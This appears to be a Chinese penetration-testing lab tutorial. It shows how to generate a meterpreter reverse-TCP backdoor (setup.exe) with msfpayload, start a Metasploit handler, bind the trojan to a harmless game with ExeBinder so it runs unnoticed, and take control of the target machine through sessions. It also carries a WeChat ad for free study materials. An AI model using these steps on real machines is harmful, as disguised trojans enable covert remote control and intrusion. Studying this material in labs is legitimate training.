这个实验主要让我们学习漏洞扫描技术基本原理，了解其在网络攻防中的作用，掌握使用Kali中的Metasploit对目标主机渗透，并根据报告做出相应的防护措施。

本次实战环境：[Kali渗透Windows服务器](https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182015082709525300001)

 **实战步骤一**

本实验通过利用kali进行漏洞扫描，使用Metasploit对目标主机进行渗透测试，并根据报告做出相应的防护措施，共分为3个实验步骤，详情如下；

1、 实战步骤一：生成setup.exe后门程序，即木马程序。

（1） 打开kali终端，输入ifconfig， 得到本机ip为192.168.189.130。

如下图：

![图片1.png](https://image.3001.net/images/20230530/1685436672_6475b900b34526e18cb35.png!small)

  

（2）输入以下命令，使用msfpayload生成名为setup的后门程序：

msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.189.130 x > setup.exe
如下图：

![图片2.png](https://image.3001.net/images/20230530/1685436674_6475b9029ecddd2f2ac0c.png!small)

  

（3） 进入setup.exe所在目录，修改属性：选择“允许以程序执行文件”。

如下图所示：

![图片3.png](https://image.3001.net/images/20230530/1685436675_6475b9036e5ef3b734a26.png!small)

（4） 终端中输入首先msfconsole；然后输入use exploit/multi/handler来加载 exploit/multi/handler
模块；输入set LHOST 192.168.189.130来设置本地主机；然后输入exploit -z -j开始监听，如下图所示：

  

![图片4.png](https://image.3001.net/images/20230530/1685436676_6475b9044ee340da8b3ba.png!small)

  

  

 **实战步骤二**

将上面生成的木马程序与某个软件进行捆绑。

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

（1）可以在windows系统下使用exe捆绑软件将setup.exe和一个其他的某个安全软件合并为一个软件，这样在运行软件时两个软件同时运行，不会引起注意。在tools里面进入名为exekunbang的文件，先打开ExeBinder.exe捆绑软件。选择第一个要合并的软件，默认选择本软件中自带的小游戏程序：

  

![图片5.png](https://image.3001.net/images/20230530/1685436677_6475b90529008c59d3180.png!small)

  

  

点击下一步，选择第二个要捆绑的软件，即之前生成的木马程序setup.exe：

  

![图片6.png](https://image.3001.net/images/20230530/1685436677_6475b905e34ba31b14148.png!small)

  

  

点击下一步，选择一个文件要保存的路径:

![图片7.png](https://image.3001.net/images/20230530/1685436679_6475b90726ffd9522577f.png!small)

  

  

![图片8.png](https://image.3001.net/images/20230530/1685436679_6475b907d692f1209937c.png!small)

  

  

继续点击下一步，开始捆绑软件:

![图片9.png](https://image.3001.net/images/20230530/1685436680_6475b9088a2ca8542738b.png!small)

  

  

(2) 将捆绑后的软件发送给目标主机。

  

![图片10.png](https://image.3001.net/images/20230530/1685436681_6475b90978eb7c31b3375.png!small)

  

  

 **实战步骤三**

检测目标主机，对目标主机进行渗透测试。

（2）
目标主机执行程序后，在kali终端中的检测程序会及时检测到。在检测到目标主机运行程序后，后门程序会反向连接到msf，之后msf发起第二次攻击（开始渗透），然后客户端（后门程序）连接到服务端（msf）。输入sessionss：

![图片11.png](https://image.3001.net/images/20230530/1685436683_6475b90ba5180f94fd98d.png!small)

  

  

可以看到目标主机的ip为192.168.189.129，

（2）再继续输入sessions -i 1,之后可以对目标主机进行一系列的操作。如输入sysinfo可知道目标主机的系统信息；输入
getuid查看对方正在运行的用户。

  

![图片12.png](https://image.3001.net/images/20230530/1685436684_6475b90c852408d05f28a.png!small)

  

要养成多思考多总结的习惯，对实验结果多去分析，这样回收获更多。比如如何利用kali进行漏洞扫描；如何使用Metasploit对目标主机进行渗透测试；这些都是这次实战后可以去思考的。

###  **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

  

